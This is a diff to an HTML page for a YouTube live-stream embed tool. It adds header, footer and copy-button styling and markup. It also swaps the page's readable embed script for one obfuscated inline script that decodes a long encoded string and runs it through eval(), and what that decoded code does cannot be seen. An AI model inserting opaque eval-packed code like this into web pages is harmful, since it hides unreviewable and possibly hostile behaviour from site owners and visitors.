@@ -32,13 +32,33 @@
             font-family: 'Arial', sans-serif;
             height: 100%;
             background: linear-gradient(120deg, #3498db, #8e44ad);
-            display: inline-flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
             color: #fff;
             overflow: auto;
             text-align: center;
+        }
+
+        /* Header Styles */
+        .header {
+            width: 100%;
+            background-color: #333;
+            color: #fff;
+            padding: 15px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        .header img {
+            max-width: 150px;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            margin: 0;
         }
 
         /* Input container */
@@ -47,13 +67,14 @@
             padding: 15px 20px;
             border-radius: 10px;
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
-            z-index: 1000;
             display: flex;
             flex-direction: column;
             align-items: center;
             width: 90%;
-            max-width: 500px;
-            margin-bottom: 20px;
+            max-width: 600px;
+            margin: 30px auto;
+            text-align: left;
+            animation: fadeIn 1s ease-out;
         }
 
         input[type="text"], select, button {
@@ -81,21 +102,32 @@
 
         /* Iframe Container */
         .iframe-container {
-            width: 90%;
-            max-width: 1000px;
-            height: 60vh;
+            width: 650px;
+            height: 80vh;
             background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
             overflow: hidden;
             box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
             display: none;
-            margin-top: 20px;
+            margin: 30px auto;
+            position: relative;
         }
 
         iframe {
             width: 100%;
             height: 100%;
             border: none;
+        }
+
+        .fallback-image {
+            width: 100%;
+            height: 100%;
+            background: url('fallback-image.jpg') no-repeat center center;
+            background-size: cover;
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
         }
 
         /* Instructions container */
@@ -107,9 +139,8 @@
             max-width: 90%;
             width: 600px;
             text-align: left;
-            margin: 20px auto;
+            margin: 28px auto;
             animation: fadeIn 1s ease-out;
-            color: #fff;
         }
 
         .instructions-container h1 {
@@ -162,11 +193,13 @@
             }
         }
 
+        /* Code Snippet Container */
         .code-snippet {
             background-color: rgba(0, 0, 0, 0.7);
             padding: 15px;
             border-radius: 10px;
             margin: 20px 0;
+            display: none; /* Initially hidden */
         }
 
         .code-snippet pre {
@@ -174,27 +207,37 @@
             color: #fff;
         }
 
-        .copy-button {
-            background-color: #3498db;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            padding: 10px 20px;
-            cursor: pointer;
-        }
+        /* Copy Button Styles */
+	.copy-container {
+    text-align: center;
+    margin: 20px 0;
+    display: flex;
+    justify-content: center; /* Center horizontally */
+    align-items: center; /* Center vertically if needed */
+	}
 
-        .copy-button:hover {
-            background-color: #2980b9;
-        }
+	.copy-button {
+    background-color: #3498db;
+    color: #fff;
+    border: 1px solid; /* Match the border color with the button */
+    border-radius: 5px;
+    padding: 10px 20px;
+    cursor: pointer;
+	display: none; /* Initially hidden */    font-size: 16px; /* Adjust as needed */
+    text-align: center; /* Center text inside the button */
+	}
 
+	.copy-button:hover {
+    background-color: #005ff6;
+    border-color: #005ff6; /* Change border color on hover */
+	}
         /* Keywords Container */
         .container111 {
-            max-width: 500px;
-            width: 100%;
             background: white;
             padding: 20px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
+            margin: 20px;
         }
 
         #keywords-container {
@@ -216,9 +259,39 @@
         .keyword-tag:hover {
             background-color: #0056b3;
         }
+
+        /* Footer Styles */
+        .footer {
+            width: 100%;
+            background-color: #222;
+            color: #fff;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 -4px 8px rgba(0, 0, 0, 0.3);
+            bottom: 0;
+        }
+
+        .footer p {
+            margin: 5px 0;
+            font-size: 14px;
+        }
+
+        .footer a {
+            color: #f39c12;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
+    <!-- Header -->
+    <div class="header">
+        <img src="logo.png" alt="Website Logo">
+        <h1>YouTube Live Stream Embed Player</h1>
+    </div>
 
     <!-- Input container for entering YouTube channel ID or username -->
     <div class="input-container">
@@ -237,6 +310,18 @@
     <!-- Iframe container for the live stream -->
     <div class="iframe-container">
         <iframe id="dynamicIframe" frameborder="0" allowfullscreen allow="autoplay; fullscreen"></iframe>
+        <div class="fallback-image"></div>
+    </div>
+
+    <!-- Copy URL and Embed Code Buttons -->
+    <div class="copy-container">
+        <button class="copy-button" id="copyUrlButton" onclick="copyUrl()">Copy URL</button>
+        <button class="copy-button" id="copyEmbedCodeButton" onclick="copyEmbedCode()">Copy Embed Code</button>
+    </div>
+
+    <!-- Hidden Code Snippet for Copying -->
+    <div class="code-snippet" id="codeSnippet">
+        <pre id="embedCode"></pre>
     </div>
 
     <!-- Instructions section -->
@@ -251,21 +336,6 @@
         </ol>
     </div>
 
-    <h4>Example of Embed Iframe:</h4>
-    <div class="code-snippet">
-        <pre><code>&lt;iframe 
-            frameborder="0" 
-            height="100%" 
-            width="450px" 
-            allowfullscreen="" 
-            scrolling="no" 
-            allow="autoplay;fullscreen" 
-            src="https://HelloPeopleTv4you.github.io/Youtube-Live-Stream-To-Embed-Convert/Player.html?id=example-youtube-channel-id/@username"&gt;
-        &lt;/iframe&gt;
-        </code></pre>
-        <button class="copy-button" onclick="copyCode()">Copy</button>
-    </div>
-
     <!-- Keywords container -->
     <div class="container111">
         <h2>Keywords</h2>
@@ -277,36 +347,12 @@
         </div>
     </div>
 
-    <script>
-        // Function to generate YouTube embed URL based on user input
-        function generateEmbed() {
-            const youtubeChannel = document.getElementById("youtubeChannel").value.trim();
-            const playerType = document.getElementById("playerSelect").value;
-            const iframeContainer = document.querySelector(".iframe-container");
-            const dynamicIframe = document.getElementById("dynamicIframe");
+   <script>var _0xc77e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe74c(d,e,f){var g=_0xc77e[2][_0xc77e[1]](_0xc77e[0]);var h=g[_0xc77e[3]](0,e);var i=g[_0xc77e[3]](0,f);var j=d[_0xc77e[1]](_0xc77e[0])[_0xc77e[10]]()[_0xc77e[9]](function(a,b,c){if(h[_0xc77e[4]](b)!==-1)return a+=h[_0xc77e[4]](b)*(Math[_0xc77e[8]](e,c))},0);var k=_0xc77e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc77e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe74c(s,e,10)-t)}return decodeURIComponent(escape(r))}("TTTTeaTTeeeaTTeeTaTepTpaTepTTaeppTaTTTTpaTTeTeaTTeTeaTTeeeaTepeTaTTTeTaTTTepaTpepTaTTTTpaTTepeaTTeeTaTpTpTaTTeeeaTTeepaTTTTpaTTepeaTTeeTaeppTaTppTpaeppTaepeeaTpTTeaTTTeTaTTeTeaTTeTeaTTeeeaTpeTTaTTTeTaTTeeeaTepppaTTeTeaTTTeTaTpeeeaTepepaeeTpaTeTppaTTeeeaTepTeaeTepaTTeppaTTepeaTepTTaTTepTaTepTeaTTTTTaeTepaTTepeaTTeeeaepeeaTpppTaTpepaTTTTeaTTeeeaTTeeTaTepTpaTepTTaeppTaTTTTeaTepTeaTeppeaTeppeaTTTeTaTTeeTaTepTTaTpTpTaTTeeeaTTeepaTTTTpaTTepeaTTeeTaeppTaTppTpaeppTaTepeTaTTepeaTTeeTaTTTepaTTeeeaTepeTaeTepaTTeTeaTTeeeaTTTTeaTTTTpaTepTTaTTepeaTTeeeaTTeeTaeTepaTTepTaTTeeeaTepTpaTepTTaTTeeTaTTTTpaTTeepaTTTeTaTpppTaTpepaTTepeaTTTeeaeppTaeTppaeppeaTTTTeaTepTeaTeppeaTeppeaTTTeTaTTeeTaTepTTaTpTpTaTTeeeaTTeepaTTTTpaTTepeaTTeeTaeTepaTTTeTaTTeeTaTTTepaTepTpaTTppeaTTepeaTepTTaTTepTaeTppaTTTTpaTTeTeaTTeTeaTTeeeaTepeTaTTTeTaTTTepaTpepTaTTTTpaTTepeaTTeeTaTpTpTaTTeeeaTTeepaTTTTpaTTepeaTTeeTaeTpTaeTpTaeppTaTeTpeaeppTaTepTpaTTTeTaTepTTaTpeeeaTTepeaTTeepaTTTeTaTTeeeaTepTeaTepTTaeTppaeTppaeTpTaeppTaTppTpaTppTTaeppTaTeTpeaeppTaTepeTaTTepeaTTeeTaTTTepaTTeeeaTepeTaeTepaTTeTeaTTeeeaTTTTeaTTTTpaTepTTaTTepeaTTeeeaTTeeTaeTepaTTepTaTeppeaTTTeTaTTTeeaeppTaTppTpaeppTaepeeaTTepTaTepTTaTepTTaTepppaTepTpaTppppaeTeTaeTeTaTTepTaTTTeTaTTeTeaTTeTeaTTeeeaTepppaTTTeTaTTeeeaTepppaTTeTeaTTTeTaTepTTaTepepaeTepaTTTTTaTTeTeaTTeeeaTTeppaTepTpaTepppaTTeeeaTepTTaeTepaTTTTeaTTeeeaTTeepaeTeTaepeeaTpppTaeppTaTeTTTaeTTTaeppTaeeTTaeTeeaeTpTaTpppTaTpepaTeTTTaeppTaTTTeeaTepTeaTTeeTaTTTTeaTepTTaTTepeaTTeeeaTTeeTaeppTaTTeppaTTTeTaTTeeTaTTTeTaTeppeaTTTTpaTepTTaTTTeTaTpTpeaTTeepaTTTTTaTTTeTaTTTepaeTppaeTpTaeppTaTeTpeaeppTaTTTTeaTTeeeaTTeeTaTepTpaTepTTaeppTaTeTppaTTeeeaTepTeaTepTTaTepTeaTTTTTaTTTeTaTpTppaTTepTaTTTTpaTTeeTaTTeeTaTTTeTaTTeTeaeppTaTppTpaeppTaTTTepaTTeeeaTTTTeaTepTeaTTeepaTTTeTaTTeeTaTepTTaeTepaTTeppaTTTeTaTepTTaTpTpeaTTeTeaTTTeTaTTeepaTTTeTaTTeeTaTepTTaTppeeaTeTppaTpTepaTTTepaeTppaepeeaTeTppaTTeeeaTepTeaTepTTaTepTeaTTTTTaTTTeTaTpTppaTTepTaTTTTpaTTeeTaTTeeTaTTTeTaTTeTeaepeeaeTpTaeTepaTepepaTTTTpaTTeTeaTepTeaTTTeTaTpppTaeppTaTTTTeaTTeeeaTTeeTaTepTpaTepTTaeppTaTepppaTTeTeaTTTTpaTeTppaTTTeTaTeppeaTpeTpaTepppaTepTTaTTepeaTTeeeaTTeeTaeppTaTppTpaeppTaTTTepaTTeeeaTTTTeaTepTeaTTeepaTTTeTaTTeeTaTepTTaeTepaTTeppaTTTeTaTepTTaTpTpeaTTeTeaTTTeTaTTeepaTTTeTaTTeeTaTepTTaTppeeaTeTppaTpTepaTTTepaeTppaepeeaTepppaTTeTeaTTTTpaTeTppaTTTeTaTeppeaTpeeTaTTTeTaTTeTeaTTTeTaTTTTeaTepTTaepeeaeTpTaeTepaTepepaTTTTpaTTeTeaTepTeaTTTeTaTpppTaeppTaTTTTeaTTeeeaTTeeTaTepTpaTepTTaeppTaTTepeaTTTeeaTeppeaTTTTpaTTeepaTTTeTaeppTaTppTpaeppTaTTTepaTTeeeaTTTTeaTepTeaTTeepaTTTeTaTTeeTaTepTTaeTepaTTeppaTTTeTaTepTTaTpTpeaTTeTeaTTTeTaTTeepaTTTeTaTTeeTaTepTTaTppeeaTeTppaTpTepaTTTepaeTppaepeeaTTTepaTeTppaTTeeTaTTTTpaTTeepaTTepeaTTTTeaTpTepaTTTeeaTeppeaTTTTpaTTeepaTTTeTaepeeaeTpTaTpppTaeppTaTTTTeaTTeeeaTTeeTaTepTpaTepTTaeppTaTTepeaTTTeeaTeppeaTTTTpaTTeepaTTTeTaTpTppaTTeeeaTTeeTaTepTTaTTTTpaTTepeaTTeeTaTTTeTaTeppeaeppTaTppTpaeppTaTTTepaTTeeeaTTTTeaTepTeaTTeepaTTTeTaTTeeTaTepTTaeTepaTeppTaTepTeaTTTeTaTeppeaTeTppaTpeeTaTTTeTaTTeTeaTTTeTaTTTTeaTepTTaTTeeeaTeppeaeTppaepeeaeTepaTTepeaTTTeeaTeppeaTTTTpaTTeepaTTTeTaeTTeaTTTTeaTTeeeaTTeeTaTepTTaTTTTpaTTepeaTTeeTaTTTeTaTeppeaepeeaeTpTaTpppTaeppTaTTTTeaTTeeeaTTeeTaTepTpaTepTTaeppTaTTTTeaTTeeeaTepppaTeTppaTTpppaTeppeaTTeTeaTppeeaTepTeaTepTTaTepTTaTTeeeaTTeeTaeppTaTppTpaeppTaTTTepaTTeeeaTTTTeaTepTeaTTeepaTTTeTaTTeeTaTepTTaeTepaTTeppaTTTeTaTepTTaTpTpeaTTeTeaTTTeTaTTeepaTTTeTaTTeeTaTepTTaTppeeaTeTppaTpTepaTTTepaeTppaepeeaTTTTeaTTeeeaTepppaTeTppaTTpppaTeppeaTTeTeaTppeeaTepTeaTepTTaTepTTaTTeeeaTTeeTaepeeaeTpTaTpppTaeppTaTTTTeaTTeeeaTTeeTaTepTpaTepTTaeppTaTTTTeaTTeeeaTepppaTeTppaTpTpeaTTeepaTTTTTaTTTeTaTTTepaTpTppaTTeeeaTTTepaTTTeTaTppeeaTepTeaTepTTaTepTTaTTeeeaTTeeTaeppTaTppTpaeppTaTTTepaTTeeeaTTTTeaTepTeaTTeepaTTTeTaTTeeTaTepTTaeTepaTTeppaTTTeTaTepTTaTpTpeaTTeTeaTTTeTaTTeepaTTTeTaTTeeTaTepTTaTppeeaTeTppaTpTepaTTTepaeTppaepeeaTTTTeaTTeeeaTepppaTeTppaTpTpeaTTeepaTTTTTaTTTeTaTTTepaTpTppaTTeeeaTTTepaTTTeTaTppeeaTepTeaTepTTaTepTTaTTeeeaTTeeTaepeeaeTpTaTpppTaeppTaTTTTeaTTeeeaTTeeTaTepTpaTepTTaeppTaTTTeTaTTeepaTTTTTaTTTeTaTTTepaTpTppaTTeeeaTTTepaTTTeTaeppTaTppTpaeppTaTTTepaTTeeeaTTTTeaTepTeaTTeepaTTTeTaTTeeTaTepTTaeTepaTTeppaTTTeTaTepTTaTpTpeaTTeTeaTTTeTaTTeepaTTTeTaTTeeTaTepTTaTppeeaTeTppaTpTepaTTTepaeTppaepeeaTTTeTaTTeepaTTTTTaTTTeTaTTTepaTpTppaTTeeeaTTTepaTTTeTaepeeaeTpTaTpppTaeppTaTTTTeaTTeeeaTTeeTaTepTpaTepTTaeppTaTTTTeaTTeeeaTTTepaTTTeTaTpeeTaTTeeTaTTepeaTepppaTepppaTTTeTaTepTTaeppTaTppTpaeppTaTTTepaTTeeeaTTTTeaTepTeaTTeepaTTTeTaTTeeTaTepTTaeTepaTTeppaTTTeTaTepTTaTpTpeaTTeTeaTTTeTaTTeepaTTTeTaTTeeTaTepTTaTppeeaTeTppaTpTepaTTTepaeTppaepeeaTTTTeaTTeeeaTTTepaTTTeTaTpeeTaTTeeTaTTepeaTepppaTepppaTTTeTaTepTTaepeeaeTpTaTpppTaeppTaTTepeaTTTeeaeppTaeTppaeppeaTeTppaTTeeeaTepTeaTepTTaTepTeaTTTTTaTTTeTaTpTppaTTepTaTTTTpaTTeeTaTTeeTaTTTeTaTTeTeaeTpTaeppTaTeTpeaeppTaTTTTpaTTeTeaTTTeTaTeppeaTepTTaeTppaepTpaTpeTTaTTeTeaTTTeTaTTTTpaTepTpaTTTeTaeppTaTTTeTaTTeeTaTepTTaTTTeTaTeppeaeppTaTTTTpaeppTaTepepaTTTTpaTTeTeaTTepeaTTTepaeppTaTTpTTaTTeeeaTepTeaTpeeeaTepTeaTTTTTaTTTeTaeppTaTpTppaTTepTaTTTTpaTTeeTaTTeeTaTTTeTaTTeTeaeppTaTpTepaTpTpTaeppTaTTeeeaTeppeaeppTaTTpppaTepTpaTTTeTaTeppeaTTeeTaTTTTpaTTeepaTTTeTaeTepaepTpaeTpTaTpppTaeppTaTeppeaTTTeTaTepTTaTepTeaTeppeaTTeeTaTpppTaeppTaTeTTTaeppTaTTeTeaTTTeTaTepTTaeppTaTTTeTaTTeepaTTTTTaTTTeTaTTTepaTTpppaTpeepaTpeppaeppTaTppTpaeppTaepeeaepeeaTpppTaeppTaTTepeaTTTeeaeppTaeTppaTepppaTTeTeaTTTTpaTeTppaTTTeTaTeppeaTpeTpaTepppaTepTTaTTepeaTTeeeaTTeeTaeppTaTppTpaTppTpaTppTpaeppTaepeeaTTTTeaTTepTaTTTTpaTTeeTaTTeeTaTTTeTaTTeTeaTTTpTaTTepeaTTTepaTTTpTaTTepTaTTTTpaTTeeTaTTTepaTTeTeaTTTeTaepeeaeTpTaeppTaTeTpeaeppTaTTTeTaTTeepaTTTTTaTTTeTaTTTepaTTpppaTpeepaTpeppaeppTaTppTpaeppTaTTTpeaTTepTaTepTTaTepTTaTepppaTepTpaTppppaeTeTaeTeTaTTepTaTTTeTaTTeTeaTTeTeaTTeeeaTepppaTTTeTaTTeeeaTepppaTTeTeaTTTeTaTepTTaTepepaeeTpaTeTppaTTeeeaTepTeaeTepaTTeppaTTepeaTepTTaTTepTaTepTeaTTTTTaeTepaTTepeaTTeeeaeTeTaTTpTTaTTeeeaTepTeaTepTTaTepTeaTTTTTaTTTeTaeTTeaTpeppaTTepeaTepepaTTTeTaeTTeaTpeeTaTepTTaTeppeaTTTeTaTTTTpaTTeepaeTTeaTpeeeaTTeeeaeTTeaTpTpeaTTeepaTTTTTaTTTeTaTTTepaeTTeaTpTppaTTeeeaTTeeTaTepepaTTTeTaTeppeaTepTTaeTeTaTepppaTTeTeaTTTTpaTeTppaTTTeTaTeppeaeTepaTTepTaTepTTaTTeepaTTeTeaTppTeaTTepeaTTTepaTppTpaepTeaTeTpeaTeTppaTTeeeaTepTeaTepTTaTepTeaTTTTTaTTTeTaTpTppaTTepTaTTTTpaTTeeTaTTeeTaTTTeTaTTeTeaTeTTTaTTTpeaTpppTaeppTaTeTTTaeppTaTTTeTaTTeTeaTepTpaTTTeTaeppTaTTepeaTTTeeaeppTaeTppaTepppaTTeTeaTTTTpaTeTppaTTTeTaTeppeaTpeTpaTepppaTepTTaTTepeaTTeeeaTTeeTaeppTaTppTpaTppTpaTppTpaeppTaepeeaTTTTeaTTepTaTTTTpaTTeeTaTTeeTaTTTeTaTTeTeaTTTpTaTepTeaTepTpaTTTeTaTeppeaTTeeTaTTTTpaTTeepaTTTeTaepeeaeTpTaeppTaTeTpeaeppTaTTTeTaTTeepaTTTTTaTTTeTaTTTepaTTpppaTpeepaTpeppaeppTaTppTpaeppTaTTTpeaTTepTaTepTTaTepTTaTepppaTepTpaTppppaeTeTaeTeTaTTepTaTTTeTaTTeTeaTTeTeaTTeeeaTepppaTTTeTaTTeeeaTepppaTTeTeaTTTeTaTepTTaTepepaeeTpaTeTppaTTeeeaTepTeaeTepaTTeppaTTepeaTepTTaTTepTaTepTeaTTTTTaeTepaTTepeaTTeeeaeTeTaTTpTTaTTeeeaTepTeaTepTTaTepTeaTTTTTaTTTeTaeTTeaTpeppaTTepeaTepepaTTTeTaeTTeaTpeeTaTepTTaTeppeaTTTeTaTTTTpaTTeepaeTTeaTpeeeaTTeeeaeTTeaTpTpeaTTeepaTTTTTaTTTeTaTTTepaeTTeaTpTppaTTeeeaTTeeTaTepepaTTTeTaTeppeaTepTTaeTeTaTepppaTTeTeaTTTTpaTeTppaTTTeTaTeppeaeTepaTTepTaTepTTaTTeepaTTeTeaTppTeaTepTeaTppTpaepTeaTeTpeaTeTppaTTeeeaTepTeaTepTTaTepTeaTTTTTaTTTeTaTpTppaTTepTaTTTTpaTTeeTaTTeeTaTTTeTaTTeTeaTeTTTaTTTpeaTpppTaeppTaTeTTTaeppTaTTepeaTTTeeaTeppeaTTTTpaTTeepaTTTeTaeTepaTepTpaTeppeaTTTTeaeppTaTppTpaeppTaTTTeTaTTeepaTTTTTaTTTeTaTTTepaTTpppaTpeepaTpeppaTpppTaeppTaTTepeaTTTeeaTeppeaTTTTpaTTeepaTTTeTaTpTppaTTeeeaTTeeTaTepTTaTTTTpaTTepeaTTeeTaTTTeTaTeppeaeTepaTepTpaTepTTaTeTppaTTeTeaTTTeTaeTepaTTTepaTTepeaTepTpaTepppaTTeTeaTTTTpaTeTppaeppTaTppTpaeppTaepeeaTTTTTaTTeTeaTTeeeaTTTTeaTTeTTaepeeaTpppTaeppTaTTTeTaTTeepaTTTTTaTTTeTaTTTepaTpTppaTTeeeaTTTepaTTTeTaeTepaTepTTaTTTeTaTepeeaTepTTaTpTppaTTeeeaTTeeTaTepTTaTTTeTaTTeeTaTepTTaeppTaTppTpaeppTaTTTpeaTpppeaTTepeaTTTeeaTeppeaTTTTpaTTeepaTTTeTaeppTaTTTeeaTeppeaTTTTpaTTeepaTTTeTaTTTTTaTTeeeaTeppeaTTTepaTTTeTaTeppeaTppTpaepTpaeTeeaepTpaeppTaTepeTaTTepeaTTTepaTepTTaTTepTaTppTpaepTpaeeTTaeeTeaeTeeaepTpaeppTaTTepTaTTTeTaTTepeaTTeppaTTepTaTepTTaTppTpaepTpaeepeaeeppaeeTTaepTpaeppTaTTTTpaTTeTeaTTeTeaTTeeeaTepeTaTTTeeaTepTeaTTeTeaTTeTeaTepTpaTTTTeaTeppeaTTTeTaTTTeTaTTeeTaTppTpaepTpaepTpaeppTaTepTpaTTTTeaTeppeaTTeeeaTTeTeaTTeTeaTTepeaTTeeTaTTeppaTppTpaepTpaTTeeTaTTeeeaepTpaeppTaTTTTpaTTeTeaTTeTeaTTeeeaTepeTaTppTpaepTpaTTTTpaTepTeaTepTTaTTeeeaTepppaTTeTeaTTTTpaTeTppaTpppTaTTTeeaTepTeaTTeTeaTTeTeaTepTpaTTTTeaTeppeaTTTeTaTTTeTaTTeeTaepTpaeppTaTepTpaTeppeaTTTTeaTppTpaepTpaepTeaTeTpeaTTTeTaTTeepaTTTTTaTTTeTaTTTepaTTpppaTpeepaTpeppaTeTTTaepTpaTppTTaTpppeaeTeTaTTepeaTTTeeaTeppeaTTTTpaTTeepaTTTeTaTppTTaTTTpeaTpppTaeppTaTTTTeaTTeeeaTepppaTeTppaTTpppaTeppeaTTeTeaTppeeaTepTeaTepTTaTepTTaTTeeeaTTeeTaeTepaTepTpaTepTTaTeTppaTTeTeaTTTeTaeTepaTTTepaTTepeaTepTpaTepppaTTeTeaTTTTpaTeTppaeppTaTppTpaeppTaepeeaTTTTTaTTeTeaTTeeeaTTTTeaTTeTTaepeeaTpppTaeppTaTTTTeaTTeeeaTepppaTeTppaTpTpeaTTeepaTTTTTaTTTeTaTTTepaTpTppaTTeeeaTTTepaTTTeTaTppeeaTepTeaTepTTaTepTTaTTeeeaTTeeTaeTepaTepTpaTepTTaTeTppaTTeTeaTTTeTaeTepaTTTepaTTepeaTepTpaTepppaTTeTeaTTTTpaTeTppaeppTaTppTpaeppTaepeeaTTTTTaTTeTeaTTeeeaTTTTeaTTeTTaepeeaTpppTaeppTaTTepeaTTTeeaTeppeaTTTTpaTTeepaTTTeTaeTepaTTeeeaTTeeTaTTTeTaTeppeaTeppeaTTeeeaTeppeaeppTaTppTpaeppTaTTTeeaTepTeaTTeeTaTTTTeaTepTTaTTepeaTTeeeaTTeeTaeTppaeTpTaeppTaTeTpeaeppTaTTepeaTTTeeaTeppeaTTTTpaTTeepaTTTeTaeTepaTepTpaTepTTaTeTppaTTeTeaTTTeTaeTepaTTTepaTTepeaTepTpaTepppaTTeTeaTTTTpaTeTppaeppTaTppTpaeppTaepeeaTTeeTaTTeeeaTTeeTaTTTeTaepeeaTpppTaeppTaTTTepaTTeeeaTTTTeaTepTeaTTeepaTTTeTaTTeeTaTepTTaeTepaTeppTaTepTeaTTTeTaTeppeaTeTppaTpeeTaTTTeTaTTeTeaTTTeTaTTTTeaTepTTaTTeeeaTeppeaeTppaepeeaeTepaTTTeeaTTTTpaTTeTeaTTeTeaTTTTTaTTTTpaTTTTeaTTeTTaeTTeaTTepeaTTeepaTTTTpaTTeppaTTTeTaepeeaeTpTaeTepaTepTpaTepTTaTeTppaTTeTeaTTTeTaeTepaTTTepaTTepeaTepTpaTepppaTTeTeaTTTTpaTeTppaeppTaTppTpaeppTaepeeaTTTTTaTTeTeaTTeeeaTTTTeaTTeTTaepeeaTpppTaeppTaTeTTTaeppTaTeTTTaeppTaTTTeeaTepTeaTTeeTaTTTTeaTepTTaTTepeaTTeeeaTTeeTaeppTaTTTTeaTTeeeaTepppaTeTppaTTpppaTeppeaTTeTeaeTppaeTpTaeppTaTeTpeaeppTaTTTTeaTTeeeaTTeeTaTepTpaTepTTaeppTaTTepeaTTTeeaTeppeaTTTTpaTTeepaTTTeTaTpeeTaTeppeaTTTTeaeppTaTppTpaeppTaTTTepaTTeeeaTTTTeaTepTeaTTeepaTTTeTaTTeeTaTepTTaeTepaTTeppaTTTeTaTepTTaTpTpeaTTeTeaTTTeTaTTeepaTTTeTaTTeeTaTepTTaTppeeaTeTppaTpTepaTTTepaeTppaepeeaTTTepaTeTppaTTeeTaTTTTpaTTeepaTTepeaTTTTeaTpTepaTTTeeaTeppeaTTTTpaTTeepaTTTeTaepeeaeTpTaeTepaTepTpaTeppeaTTTTeaTpppTaeppTaTTeeTaTTTTpaTepepaTTepeaTTeppaTTTTpaTepTTaTTeeeaTeppeaeTepaTTTTeaTTeTeaTTepeaTepppaTTTTTaTTeeeaTTTTpaTeppeaTTTepaeTepaTepeTaTeppeaTTepeaTepTTaTTTeTaTpeeeaTTTeTaTepeeaTepTTaeTppaTTepeaTTTeeaTeppeaTTTTpaTTeepaTTTeTaTpeeTaTeppeaTTTTeaeTpTaeTepaTepTTaTTepTaTTTeTaTTeeTaeTppaeTppaeTpTaeppTaTppTpaTppTTaeppTaTeTpeaeppTaTTTTpaTTeTeaTTTeTaTeppeaTepTTaeTppaepeeaTTpppaTpeepaTpeppaeppTaTTTTeaTTeeeaTepppaTTepeaTTTeTaTTTepaeppTaTepTTaTTeeeaeppTaTTTTeaTTeTeaTTepeaTepppaTTTTTaTTeeeaTTTTpaTeppeaTTTepaeppeaepeeaeTpTaTpppTaeppTaTeTTTaeTTTaeppTaeTppaTTTeTaTeppeaTeppeaeTpTaeppTaTppTpaTppTTaeppTaTeTpeaeppTaTTTTeaTTeeeaTTeeTaTepTpaTTeeeaTTeTeaTTTeTaeTepaTTTeTaTeppeaTeppeaTTeeeaTeppeaeTppaepeeaTpTTpaTTTTpaTTepeaTTeTeaTTTeTaTTTepaeppTaTepTTaTTeeeaeppTaTTTTeaTTeeeaTepppaTeTppaeppTaTTpppaTpeepaTpeppaTppppaeppTaepeeaeTTTaeppTaTTTeTaTeppeaTeppeaeTpTaTpppTaeppTaTeTTTaeTpTaTpppTaeppTaTeTTTaeppTaTTTeeaTepTeaTTeeTaTTTTeaTepTTaTTepeaTTeeeaTTeeTaeppTaTTTTeaTTeeeaTepppaTeTppaTpTpeaTTeepaTTTTTaTTTeTaTTTepaTpTppaTTeeeaTTTepaTTTeTaeTppaeTpTaeppTaTeTpeaeppTaTTTTeaTTeeeaTTeeTaTepTpaTepTTaeppTaTTTTeaTTeeeaTTTepaTTTeTaTpeeTaTTeeTaTTepeaTepppaTepppaTTTeTaTepTTaeppTaTppTpaeppTaTTTepaTTeeeaTTTTeaTepTeaTTeepaTTTeTaTTeeTaTepTTaeTepaTTeppaTTTeTaTepTTaTpTpeaTTeTeaTTTeTaTTeepaTTTeTaTTeeTaTepTTaTppeeaTeTppaTpTepaTTTepaeTppaepeeaTTTeTaTTeepaTTTTTaTTTeTaTTTepaTpTppaTTeeeaTTTepaTTTeTaepeeaeTpTaeTepaTepTTaTTTeTaTepeeaTepTTaTpTppaTTeeeaTTeeTaTepTTaTTTeTaTTeeTaTepTTaTpppTaeppTaTTeeTaTTTTpaTepepaTTepeaTTeppaTTTTpaTepTTaTTeeeaTeppeaeTepaTTTTeaTTeTeaTTepeaTepppaTTTTTaTTeeeaTTTTpaTeppeaTTTepaeTepaTepeTaTeppeaTTepeaTepTTaTTTeTaTpeeeaTTTeTaTepeeaTepTTaeTppaTTTTeaTTeeeaTTTepaTTTeTaTpeeTaTTeeTaTTepeaTepppaTepppaTTTeTaTepTTaeTpTaeTepaTepTTaTTepTaTTTeTaTTeeTaeTppaeTppaeTpTaeppTaTppTpaTppTTaeppTaTeTpeaeppTaTTTTpaTTeTeaTTTeTaTeppeaTepTTaeTppaepeeaTpTpeaTTeepaTTTTTaTTTeTaTTTepaeppTaTTTTeaTTeeeaTTTepaTTTeTaeppTaTTTTeaTTeeeaTepppaTTepeaTTTeTaTTTepaeppTaTepTTaTTeeeaeppTaTTTTeaTTeTeaTTepeaTepppaTTTTTaTTeeeaTTTTpaTeppeaTTTepaeppeaepeeaeTpTaTpppTaeppTaTeTTTaeTTTaeppTaeTppaTTTeTaTeppeaTeppeaeTpTaeppTaTppTpaTppTTaeppTaTeTpeaeppTaTTTTeaTTeeeaTTeeTaTepTpaTTeeeaTTeTeaTTTeTaeTepaTTTeTaTeppeaTeppeaTTeeeaTeppeaeTppaepeeaTpTTpaTTTTpaTTepeaTTeTeaTTTeTaTTTepaeppTaTepTTaTTeeeaeppTaTTTTeaTTeeeaTepppaTeTppaeppTaTTTeTaTTeepaTTTTTaTTTeTaTTTepaeppTaTTTTeaTTeeeaTTTepaTTTeTaTppppaeppTaepeeaeTTTaeppTaTTTeTaTeppeaTeppeaeTpTaTpppTaeppTaTeTTTaeTpTaTpppTaeppTaTeTTTa",63,"pTeaSgwoU",23,3,2))</script>
 
-            let embedUrl = "";
-
-            if (youtubeChannel) {
-                if (playerType === "channel_id_handle") {
